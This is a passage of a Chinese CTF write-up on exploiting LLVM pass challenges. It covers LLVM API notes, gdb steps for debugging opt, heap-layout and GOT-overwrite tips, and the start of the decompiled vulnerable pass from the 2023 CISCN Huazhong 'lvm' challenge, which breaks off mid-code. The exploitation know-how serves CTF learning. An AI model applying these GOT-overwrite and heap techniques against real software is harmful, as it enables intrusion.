id="函数对照">函数对照</h2><ul><li>getName()：获取当前处理的函数名</li><li>getOpcodeName()：获取操作符名称</li><li>getOpcodeName()函数用于获取指令的操作符的名称</li><li>getNumOperands()用于获取指令的操作数的个数</li><li>getOpcode()函数用于获取指令的操作符编号，在/usr/include/llvm-xx/llvm/IR/Instruction.def可以找到编号和操作符的对应表</li><li>getOperand(i)是用于获取第i个操作数（在这里就是获取所调用函数的第i个参数），getArgOperand()函数与其用法类似，但只能获取参数，getZExtValue()即get Zero Extended Value，也就是将获取的操作数转为无符号扩展整数。</li></ul><h1 id="调试">调试</h1><p>调试实际上是调试opt，所以采用如下方法调试即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./opt</span><br></pre></td></tr></table></figure><p>先用gdb调试opt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set args -load ./&lt;pass so name&gt;.so -&lt;pass name&gt; exp.ll</span><br><span class="line">start</span><br></pre></td></tr></table></figure><p>再设置参数加载pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &lt;一系列call指令数&gt;</span><br></pre></td></tr></table></figure><p>在开始的200左右个call指令后，pass.so才会加载进内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *&lt;pass加载地址&gt;+&lt;偏移&gt;</span><br></pre></td></tr></table></figure><h2 id="注意事项">注意事项</h2><ol><li><strong>heap</strong></li></ol><p>由于opt是一个较为复杂的软件，运行过程中，存在相当多的无关chunk的分配，而且，由于exp.ll会被加载进入内存，即使exp变动的很小，chunk布局也可能会发生改变，因此需要小心注意chunk之间的偏移，可以考虑预先多分配一些chunk填充，方便之后更改偏移。</p><ol start="2"><li><strong>got</strong><br>如何选择覆写的got表？</li></ol><p>首先通过调用链确定runOnFunction 的调用位置。<br><img src="images/20230630161150.png" alt></p><p>然后通过<code>finish</code> 返回到main后，查找后面使用到的got表即可</p><h1 id="example">example</h1><h2 id="2023-ciscn-huazhong-lvm">2023-ciscn-huazhong-lvm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_8050</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// rax</span></span><br><span class="line">  llvm::BasicBlock *v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::Instruction *v5; <span class="comment">// rax</span></span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  llvm::User *v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v14; <span class="comment">// rax</span></span><br><span class="line">  llvm::User *v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v21; <span class="comment">// rax</span></span><br><span class="line">  llvm::User *v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v24; <span class="comment">// rax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v26; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [rsp+Eh] [rbp-182h]</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [rsp+Fh] [rbp-181h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+14h] [rbp-17Ch]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+18h] [rbp-178h] BYREF</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+20h] [rbp-170h] BYREF</span></span><br><span class="line">  __int64 v34[<span class="number">2</span>]; <span class="comment">// [rsp+28h] [rbp-168h] BYREF</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+38h] [rbp-158h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+40h] [rbp-150h]</span></span><br><span class="line">  __int64 v37[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-148h] BYREF</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+58h] [rbp-138h]</span></span><br><span class="line">  __int64 v39; <span class="comment">// [rsp+60h] [rbp-130h]</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// [rsp+6Ch] [rbp-124h]</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// [rsp+70h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// [rsp+74h] [rbp-11Ch]</span></span><br><span class="line">  __int64 v43; <span class="comment">// [rsp+78h] [rbp-118h] BYREF</span></span><br><span class="line">  __int64 v44; <span class="comment">// [rsp+80h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v45; <span class="comment">// [rsp+88h] [rbp-108h] BYREF</span></span><br><span class="line">  __int64 v46[<span class="number">2</span>]; <span class="comment">// [rsp+90h] [rbp-100h] BYREF</span></span><br><span class="line">  __int64 v47; <span class="comment">// [rsp+A0h] [rbp-F0h]</span></span><br><span class="line">  __int64 v48; <span class="comment">// [rsp+A8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// [rsp+B4h] [rbp-DCh]</span></span><br><span class="line">  __int64 v50; <span class="comment">// [rsp+B8h] [rbp-D8h] BYREF</span></span><br><span class="line">  _QWORD v51[<span class="number">2</span>]; <span class="comment">// [rsp+C0h] [rbp-D0h] BYREF</span></span><br><span class="line">  __int64 v52; <span class="comment">// [rsp+D0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v53; <span class="comment">// [rsp+D8h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+E4h] [rbp-ACh]</span></span><br><span class="line">  <span class="type">void</span> *v55; <span class="comment">// [rsp+E8h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">int</span> ZExtValue; <span class="comment">// [rsp+F4h] [rbp-9Ch]</span></span><br><span class="line">  __int64 Operand; <span class="comment">// [rsp+F8h] [rbp-98h] BYREF</span></span><br><span class="line">  _QWORD v58[<span class="number">2</span>]; <span class="comment">// [rsp+100h] [rbp-90h] BYREF</span></span><br><span class="line">  __int64 v59; <span class="comment">// [rsp+110h] [rbp-80h]</span></span><br><span class="line">  __int64 v60; <span class="comment">// [rsp+118h] [rbp-78h]</span></span><br><span class="line">  __int64 Name; <span class="comment">// [rsp+120h] [rbp-70h]</span></span><br><span class="line">  __int64 v62; <span class="comment">// [rsp+128h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v63; <span class="comment">// [rsp+130h] [rbp-60h]</span></span><br><span class="line">  __int64 v64; <span class="comment">// [rsp+138h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 v65; <span class="comment">// [rsp+140h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v66; <span class="comment">// [rsp+148h] [rbp-48h] BYREF</span></span><br><span class="line">  __int64 v67; <span class="comment">// [rsp+150h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v68; <span class="comment">// [rsp+158h] [rbp-38h] BYREF</span></span><br><span class="line">  _QWORD v69[<span class="number">3</span>]; <span class="comment">// [rsp+160h] [rbp-30h] BYREF</span></span><br><span class="line">  llvm::Function *v70; <span class="comment">// [rsp+178h] [rbp-18h]</span></span><br><span class="line">  __int64 v71; <span class="comment">// [rsp+180h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v72; <span class="comment">// [rsp+18Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v71 = a1;</span><br><span class="line">  v70 = a2;</span><br><span class="line">  v69[<span class="number">1</span>] = llvm::Value::getName(a2);</span><br><span class="line">  v69[<span class="number">2</span>] = v2;</span><br><span class="line">  v68 = llvm::Function::end(a2);</span><br><span class="line">  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::ilist_iterator&lt;<span class="literal">false</span>&gt;(</span><br><span class="line">    v69,</span><br><span class="line">    &amp;v68,</span><br><span class="line">    <span class="number">0LL</span>);</span><br><span class="line">  v66 = llvm::Function::begin(v70);</span><br><span class="line">  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::ilist_iterator&lt;<span class="literal">false</span>&gt;(</span><br><span class="line">    &amp;v67,</span><br><span class="line">    &amp;v66,</span><br><span class="line">    <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( (llvm::operator!=(&amp;v67, v69) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v67);</span><br><span class="line">    v65 = llvm::BasicBlock::begin(v3);</span><br><span class="line">    v4 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v67);</span><br><span class="line">    v64 = llvm::BasicBlock::end(v4);</span><br><span class="line">    <span class="keyword">while</span> ( (llvm::operator!=(&amp;v65, &amp;v64) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (llvm::Instruction *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v65);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v5) == <span class="number">56</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v63 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(&amp;v65);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v63);</span><br><span class="line">        Name = llvm::Value::getName(CalledFunction);</span><br><span class="line">        v62 = v7;</span><br><span class="line">        v59 = Name;</span><br><span class="line">        v60 = v7;</span><br><span class="line">        llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v58, <span class="string">&quot;Add&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (llvm::operator==(v59, v60, v58[<span class="number">0</span>], v58[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Operand = llvm::CallBase::getOperand(v63, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = llvm::errs((llvm *)&amp;Operand);</span><br><span class="line">            v11 = llvm::raw_ostream::operator&lt;&lt;(v10, <span class="string">&quot;Error argument&quot;</span>);</span><br><span class="line">            llvm::raw_ostream::operator&lt;&lt;(v11, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            v72 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          ArgOperand = llvm::CallBase::getArgOperand(v63, <span class="number">0</span>);</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">          ZExtValue = llvm::ConstantInt::getZExtValue(v9);</span><br><span class="line">          v55 = <span class="number">0LL</span>;</span><br><span class="line">          v55 = <span class="built_in">malloc</span>(ZExtValue);</span><br><span class="line">          <span class="keyword">if</span> ( !v55 )</span><br><span class="line">          &#123;</span><br><span class="line">            perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">            v72 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !*((_QWORD *)&amp;addrList + i) )</span><br><span class="line">            &#123;</span><br><span class="line">              *((_QWORD *)&amp;addrList + i) = v55;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v52 = Name;</span><br><span class="line">          v53 = v62;</span><br><span class="line">          llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v51, <span class="string">&quot;Del&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (llvm::operator==(v52, v53, v51[<span class="number">0</span>], v51[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v12 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v65);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::User::getNumOperands(v12) != <span class="number">2</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;ERROR argument size&quot;</span>);</span><br><span class="line">              v72 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v50 = llvm::CallBase::getOperand(v63, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v50) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::getArgOperand(v63, <span class="number">0</span>);</span><br><span class="line">              v14 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              v49 = llvm::ConstantInt::getZExtValue(v14);</span><br><span class="line">              <span class="keyword">if</span> ( !*((_QWORD *)&amp;addrList + v49) || v49 &gt;= <span class="number">32</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v72 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;addrList + v49));</span><br><span class="line">              *((_QWORD *)&amp;addrList + v49) = <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v47 = Name;</span><br><span class="line">            v48 = v62;</span><br><span class="line">            llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v46, <span class="string">&quot;Edit&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (llvm::operator==(v47, v48, v46[<span class="number">0</span>], v46[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v15 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v65);</span><br><span class="line">              <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::User::getNumOperands(v15) != <span class="number">4</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">              v45 = llvm::CallBase::getOperand(v63, <span class="number">0</span>);</span><br><span class="line">              v29 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v45) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v44 = llvm::CallBase::getOperand(v63, <span class="number">1u</span>);</span><br><span class="line">                v29 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v44) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v43 = llvm::CallBase::getOperand(v63, <span class="number">2u</span>);</span><br><span class="line">                  v29 = llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v43);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( (v29 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v16 = llvm::CallBase::getArgOperand(v63, <span class="number">0</span>);</span><br><span class="line">                v17 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">                v42 = llvm::ConstantInt::getZExtValue(v17);</span><br><span class="line">                v18 = llvm::CallBase::getArgOperand(v63, <span class="number">1u</span>);</span><br><span class="line">                v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">                v41 = llvm::ConstantInt::getZExtValue(v19);</span><br><span class="line">                v20 = llvm::CallBase::getArgOperand(v63, <span class="number">2u</span>);</span><br><span class="line">                v21 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v20);</span><br><span class="line">                v40 = llvm::ConstantInt::getZExtValue(v21);</span><br><span class="line">                <span class="keyword">if</span> ( !*((_QWORD *)&amp;addrList + v42) || v42 &gt;= <span class="number">32</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v72 = <span class="number">0</span>;</span><br><span class="line">                  <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *(_DWORD *)(*((_QWORD *)&amp;addrList + v42) + <span class="number">4LL</span> * v41) = v40;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v38 = Name;</span><br><span class="line">              v39 = v62;</span><br><span class="line">              llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v37, <span class="string">&quot;Alloc&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> ( (llvm::operator==(v38, v39, v37[<span class="number">0</span>], v37[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                mmap(&amp;off_10000, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v35 = Name;</span><br><span class="line">                v36 = v62;</span><br><span class="line">                llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v34, <span class="string">&quot;EditAlloc&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> ( (llvm::operator==(v35, v36, v34[<span class="number">0</span>], v34[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v22 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v65);</span><br><span class="line">                  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::User::getNumOperands(v22) != <span class="number">3</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">LABEL_28:</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Error argument size&quot;</span>);</span><br><span class="line">                    v72 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v33 = llvm::CallBase::getOperand(v63, <span class="number">0</span>);</span><br><span class="line">                  v28 = <span class="number">0</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v33) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v32 = llvm::CallBase::getOperand(v63, <span class="number">1u</span>);</span><br><span class="line">                    v28 = llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v32);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( (v28 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v23 = llvm::CallBase::getArgOperand(v63, <span class="number">0</span>);</span><br><span class="line">                    v24 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v23);</span><br><span class="line">                    v31 = llvm::ConstantInt::getZExtValue(v24);</span><br><span class="line">                    v25 = llvm::CallBase::getArgOperand(v63, <span class="number">1u</span>);</span><br><span class="line">                    v26 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">                    v30 = llvm::ConstantInt::getZExtValue(v26);</span><br><span class="line">                    <span class="keyword">if</span> ( !*((_QWORD *)&amp;addrList + v31) || v31 &gt;= <span class="number">32</span> || v30 &gt;= <span class="number">256</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v72 = <span class="number">0</span>;</span><br><span class="line">                      <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *(_DWORD *)(v30 + <span 